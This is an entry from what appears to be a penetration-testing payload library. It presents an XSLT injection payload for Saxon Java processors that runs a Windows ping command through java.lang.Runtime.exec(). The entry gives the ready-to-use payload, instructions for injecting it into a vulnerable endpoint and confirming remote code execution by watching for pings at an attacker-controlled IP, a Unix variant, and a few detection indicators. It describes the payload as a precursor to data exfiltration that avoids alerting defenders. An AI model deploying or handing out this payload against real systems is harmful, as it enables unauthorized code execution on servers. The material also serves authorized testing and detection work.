---
id: 7954d384-980d-489f-ad09-812273ff37d8
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:41.581830+00:00'
updated_at: '2023-04-10T20:24:51.179803+00:00'
tags:
  - xslt-injection
  - rce
  - java-runtime
  - ping
platforms:
  - Web
  - Java
  - Windows
validated: true
---

# XSLT-Ping-Command-via-Java-Runtime

## Code

```xml
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>
```

## Description

This XSLT payload targets Saxon Java processors to execute a Windows 'ping' command via java.lang.Runtime.exec(). It sends an ICMP echo to a specified IP, useful for verifying outbound connectivity or as a precursor to data exfiltration in an RCE scenario.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| IP | Target IP address or hostname for the ping | '192.168.1.1' |

## Usage

Replace 'IP' with the desired target and inject as the XSLT in a vulnerable endpoint request. Monitor the target IP for incoming pings to confirm execution. Adapt for Unix: replace with '/bin/ping -c 1 IP'. Used in penetration testing to validate RCE without alerting via file changes.

## Detection

- Logs showing Saxon XSLT processing with 'java:java.lang.Runtime' namespaces.
- Unusual outbound ICMP traffic from the web server to attacker-controlled IPs.
- Command execution traces for 'cmd.exe /C ping' in process monitoring.
- Input validation alerts for XSLT containing 'saxon.sf.net/java-type'.

## Related

- [[procedures/XSLT-Injection-for-Java-RCE]]
